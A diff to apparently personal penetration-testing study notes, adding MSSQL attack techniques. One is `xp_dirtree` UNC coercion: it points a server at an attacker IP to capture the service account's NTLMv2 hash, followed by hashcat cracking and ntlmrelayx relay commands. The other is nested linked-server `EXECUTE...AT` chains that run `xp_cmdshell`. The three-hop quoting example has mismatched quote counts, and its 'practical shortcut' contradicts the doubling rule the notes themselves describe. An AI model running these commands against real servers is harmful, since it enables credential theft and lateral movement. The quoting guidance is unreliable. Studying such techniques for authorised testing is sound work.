@@ -314,7 +314,67 @@ offsec'; SELECT 1/0--
 
 ---
 
+---
+
+## MSSQL `xp_dirtree` UNC hash coercion: why a stored procedure causes outbound SMB auth
+
+**Full command:**
+```sql
+EXECUTE master..xp_dirtree '\\192.168.45.200\share', 1, 1;
+```
+Listener on Kali:
+```bash
+sudo impacket-smbserver -smb2support share /tmp/share
+```
+
+**Piece by piece:**
+- `xp_dirtree` → an extended stored procedure that reads a directory tree and returns file/folder names. Extended procs run as native code inside MSSQL's process space, so they can do anything the MSSQL service account can do — including making outbound network connections.
+- `'\\192.168.45.200\share'` → a UNC path pointing at the attacker's machine. When MSSQL resolves a UNC path, it initiates an **SMB connection** to the specified host to enumerate the share.
+- **Windows NTLM authentication is automatic.** The OS sends the MSSQL service account's Net-NTLMv2 hash as part of the SMB handshake, without prompting anyone. The attacker's SMB server (impacket-smbserver) is configured to capture and log that hash.
+- `, 1, 1` → depth=1 (recurse 1 level), include files=1. The exact values don't matter for the hash capture — the connection and auth happen before the directory listing even starts.
+
+**Why this works even when xp_cmdshell is disabled:**
+`xp_cmdshell` requires the `xp_cmdshell` advanced option to be enabled. `xp_dirtree` is a different extended proc with no such gate — it's enabled in most default MSSQL configurations. The two procs are independently controlled.
+
+**What to do with the captured hash:**
+The output is a Net-NTLMv2 hash (same format as Responder captures). Crack offline: `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`. If cracking fails, try relay (impacket-ntlmrelayx targeting another host the service account has admin on).
+
+**Where this comes from:** The `xp_dirtree` UNC coercion technique is well-documented in HackTricks and PayloadsAllTheThings. The underlying mechanism is Windows' automatic NTLM auth for any UNC path — same root cause as Responder LLMNR poisoning, just triggered via a database proc instead of a broadcast.
+
+🔁 [[Attacking Common Services (HTB Supplementary)#CS.6 MSSQL — xp_dirtree UNC Hash Coercion|CS.6]]
+
+---
+
+## MSSQL linked server `EXECUTE...AT`: nested `''` quote escaping
+
+**Full command:**
+```sql
+EXECUTE ('SELECT SYSTEM_USER') AT [LINKED_SRV];
+
+-- Nested: run a command ON the linked server that itself runs a command on a second server
+EXECUTE ('EXECUTE (''SELECT SYSTEM_USER'') AT [INNER_SRV]') AT [OUTER_SRV];
+
+-- Three levels deep: run xp_cmdshell via two hops
+EXECUTE ('EXECUTE (''EXECUTE (''''xp_cmdshell ''''''''whoami'''''''''''') AT [INNER]'') AT [OUTER]') AT [LOCAL_LINKED];
+```
+
+**Piece by piece:**
+- `EXECUTE ('...') AT [server]` → sends the quoted string as a T-SQL statement to the linked server. The linked server receives the string and executes it as a local query.
+- **The `''` doubling rule:** Inside a SQL string literal, a single quote is escaped by doubling it. So `'it''s'` represents the string `it's`. When you're nesting EXECUTE...AT blocks, each level of nesting adds another layer of string escaping.
+
+**How the nesting stacks:**
+- **Level 1 (local):** sends the literal string `SELECT SYSTEM_USER` to OUTER_SRV.
+- **Level 2 (outer server runs):** outer server sees `EXECUTE ('SELECT SYSTEM_USER') AT [INNER_SRV]` — but since this is inside a level-1 string, the inner single quotes were doubled: `''SELECT SYSTEM_USER''`.
+- **Level 3:** adds another layer — each `'` inside the level-2 string becomes `''''` in the level-1 source.
+
+**Practical shortcut:** When building a three-hop chain, count how many string levels deep the quote sits and add that many extra `'` pairs. One level deep = `''`. Two levels deep = `''''`. Three levels = `''''''`.
+
+**Where this comes from:** MSSQL T-SQL documentation on string literal escaping and the `EXECUTE...AT` distributed query syntax.
+
+🔁 [[Attacking Common Services (HTB Supplementary)#CS.9 MSSQL — Linked Server Execution|CS.9]]
+
 ## **Outstanding**
 - [x] UNION-based extraction, `INTO OUTFILE` webshell drop, `xp_cmdshell` (MSSQL), sqlmap `--technique`/`--os-shell` internals, done 2026-08-04.
 - [x] PostgreSQL `CAST()` error-based extraction, stacked-query RCE via `COPY FROM PROGRAM`, done 2026-08-04.
+- [x] xp_dirtree UNC hash coercion, EXECUTE...AT nested quoting, done 2026-08-17.
 - [ ] Boolean-blind vs time-blind logic (the `IF(1=1, sleep(3), 'false')` construct), still outstanding.
